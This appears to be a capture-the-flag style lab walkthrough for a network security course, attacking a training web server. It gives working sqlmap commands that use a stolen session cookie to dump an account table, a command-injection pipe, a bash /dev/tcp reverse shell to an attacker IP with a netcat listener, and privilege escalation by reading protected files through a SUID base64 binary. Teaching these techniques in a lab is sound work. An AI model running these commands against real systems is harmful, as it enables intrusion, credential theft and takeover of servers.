# Network Security DSP

### Goals
* Read the file "flag.txt"
* Steal the root password

## Man In The Middle

## Cookie Stealing and Hijacking Session

## SQL injection

SQL (Structured Query Language) Injection, mostly referred to as SQLI, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input form a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas.
This is why as well as SQLI being one of the oldest web application vulnerabilities, it also can be most damaging.

In this scenario, it is possible to search among the products in the database using an html form. You can see that this is a GET request by looking at the URL:

* http://193.20.1.2:5000/search?nome=mela

From the URL above, you can see that the results comes from the "nome" parameter in the query string. The web application needs to retreive the article from the database and may use an SQL statement that looks something like the following:
* **SELECT all FROM table WHERE nome=mela**

You can assume that this query is to search for stored products of a table. Is there a way to explore the other tables?

### Union-Based SQL Injection

This type of injection utilises the **SQL UNION** operator alongside a **SELECT** statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

### SQLMap

It's an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

If you are using the attacking machine that was provided to you, sqlmap is already installed. Otherwise, you can download it here: https://github.com/sqlmapproject/sqlmap

To check if the "name" parameter is vulnerable it is necessary to set the session (previously stolen) to allow sqlmap to see the /search page, to do this you need to use the following command:

**sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION"**
* **-u**: Target Url
* **-p**: Testable parameter(s)
* **--cookie**: HTTP cookie header value

After that we can proceed to inspect the databases:

**sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" --tables**
* **--tables**: Enumaret DBMS database tables

It turns out that there is a database called "networkSecurity" with a table called "account". The last step is to see the contents of this table:

**sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" -D networkSecurity -T account --dump**
* **-D**: DBMS database to enumerate
* **-T**: DBMS database table(s) to enumerate
* **--dump**: Dump DBMS database table entries

## Command Injection

**Command Injection** is an attack in wich the goal is execution of arbitrary commands on the host operating system via a vulnerable application. These attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system command are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

Having logged in with the admin credentials, you are redirected to the /admin page. You may notice a form that says "*Explore your File System*", using this feature the admin can navigate through the folders containing the source codes for the web application. It is possible to assume that the web application uses a function to launch commands that will be executed by the shell.
The command being executed probably looks something like this:
* **"ls -l " + input**

The current goal is to find a way to execute malicious commands by taking advantage of possible poor input validation, to do this we can use the pipe command.

### Pipe Command
A pipe is an aspect of redirection i.e., transfer of any standard output to another target path which is commonly used in Unix and Linux-like operating systems in order to send the outputs of one process/command/program to another/program/command/process for any further processing. The Linux/Unix system enables stdout of a command to connect to stdin of other commands, which we can do by the pipe character ‘|.’

### && Operator in Linux

The Bash logical (&&) operator is one of the most useful commands that can be used in multiple ways, like you can use in the conditional statement or execute multiple commands simultaneously. Generally speaking, the logical operator is the one that is used to connect more than one expression and then provides the output based on their combined result.

These are just some of the possible ways to chain multiple commands, you can do an initial test with the *whoami* command:
* **ls -l | whoami**

### Reverse Shell
To gain control over a compromised system, an attacker usually aims to gain interactive shell access for arbitrary command execution. With such access, they can try to elevate their privileges to obtain full control of the operating system. However, most systems are behind firewalls and direct remote shell connections are impossible. One of the methods used to circumvent this limitation is a reverse shell.

In a typical remote system access scenario, the user is the client and the target machine is the server. The user initiates a remote shell connection and the target system listens for such connections. With a reverse shell, the roles are opposite. It is the target machine that initiates the connection to the user, and the user’s computer listens for incoming connections on a specified port.

The primary reason why reverse shells are often used by attackers is the way that most firewalls are configured. Attacked servers usually allow connections only on specific ports. For example, a dedicated web server will only accept connections on ports 80 and 443. This means that there is no possibility to establish a shell listener on the attacked server. On the other hand, firewalls usually do not limit outgoing connections at all. Therefore, an attacker may establish a server on their own machine and create a reverse connection. All that the attacker needs is a machine that has a public (routable) IP address and a tool such as netcat to create the listener and bind shell access to it.

It is possible to have the server open a terminal to our attacking machine. To do this, you can open a shell to a remote address with a simple terminal command:
* **bash -i >& /dev/tcp/IP_ADDRESS/PORT**

You need to listen on the attacking machine in order to accept the server connection. We use the netcat tool to do this:
* **nc -lnvp PORT** (you can choose any free port)

Thanks to command injection, we can open a remote shell on our attacking machine by typing the command:
* **bash -c "bash -i >& /dev/tcp/193.20.1.4/PORT 0>&1"**

In this case, the server does not use the **/bin/bash** shell by default, so you need to invoke it with the **-c** flag to specify which command it should execute. If everything went well, the server will get stuck loading the page, and a remote shell will open on your terminal.

## Privilege Escalation
At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:
* Execute any administrative command
* Resettings passwords
* Editing software configurations
* Bypassing access controls to compromise protected data
* Enabling persistence
* Changing the privilege of existing (or new) users

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or, in this case, just found a way to send commands using a low privileged account.

Shown below are some of the possible ways to get system information.

* ### uname -a
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation

* ### /proc/version
Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

* ### ps Command
The **ps** command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell. 

* ### env
The env command will show environmental variables. The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

* ### sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

* ### id
The id command will provide a general overview of the user’s privilege level and group memberships. It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

* ### /etc/passwd
Reading the /etc/passwd file can be an easy way to discover users on the system. 

* ### ifconfig
The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. 

* ### netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The netstat command can be used with several different options to gather information on existing connections. 

* ### find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

### SUID
Much of Linux's privilege checks rely on checking users and file interactions. This is done with permissions. By now you know that files can have read, write and execute permissions. These are provided to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow you to run files with the permission level of the file owner or group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.

**find / -type f -perm -04000 -ls 2>/dev/null** will list files that have SUID or SGID bits set.

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.

We can notice that **base64** command has the bit **s** set. As you can read at the following link:
* https://gtfobins.github.io/gtfobins/base64/#suid

Thanks to this, it is possible to read files on which the admin user doesn't have access permissions by running:
* **base64 file | base64 -d**

## Cracking Password
